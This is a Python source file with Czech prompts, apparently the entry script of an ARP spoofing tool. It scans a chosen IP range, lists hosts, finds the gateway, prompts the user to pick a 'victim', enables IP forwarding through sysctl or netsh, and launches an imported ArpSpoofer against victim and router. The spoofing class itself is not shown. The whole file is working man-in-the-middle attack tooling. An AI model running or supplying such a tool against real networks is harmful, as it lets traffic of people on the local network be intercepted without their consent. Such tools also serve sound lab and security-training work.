import atexit
import os
import platform

from scapy.all import conf

from network_utils import SelectTargetParams, get_gateway_mac, get_target, scan_network
from spoofer_logic import ArpSpoofer


def toggle_forwarding(enable: bool) -> None:
    system = platform.system()
    match system:
        case "Linux":
            os.system(f"sysctl -w net.ipv4.ip_forward={'1' if enable else '0'}")
        case "Windows":
            os.system(f"netsh interface ipv4 set global forwarding={'enabled' if enable else 'disabled'}")
        case _:
            print("[-] Neznámý OS. Nelze nastavit IP forwarding.")


def main() -> None:
    ip_range = input("[?] Zadejte IP rozsah (např. 192.168.1.1/24): ").strip()

    print("\n[+] Skenuji síť...")
    devices = scan_network(ip_range)
    for i, d in enumerate(devices, start=1):
        print(f"{i}. | IP: {d['ip']} | MAC: {d['mac']}")

    router_ip = conf.route.route("0.0.0.0/0")[2]
    router_mac = get_gateway_mac()
    if not router_mac:
        print("[-] Nepodařilo se získat MAC routeru. Ukončuji.")
        return
    print(f"\n[+] Router: IP: {router_ip} | MAC: {router_mac}")

    while True:
        choice = input("\n[?] Zadejte číslo oběti (nebo 'r' pro router): ").strip().lower()
        if not choice:
            print("[-] Neplatný vstup.")
            continue
        if choice == "r":
            target_ip, target_mac = router_ip, router_mac
            break
        try:
            target_ip, target_mac = get_target(SelectTargetParams(choice=choice, devices=devices))
            break
        except ValueError as e:
            print(e)

    print("\n[+] Zapínám IP forwarding...")
    toggle_forwarding(True)
    atexit.register(lambda: (print("\n[+] Vypínám IP forwarding..."), toggle_forwarding(False)))

    ArpSpoofer(
        target_ip=target_ip,
        target_mac=target_mac,
        router_ip=router_ip,
        router_mac=router_mac,
    ).run()


if __name__ == "__main__":
    main()
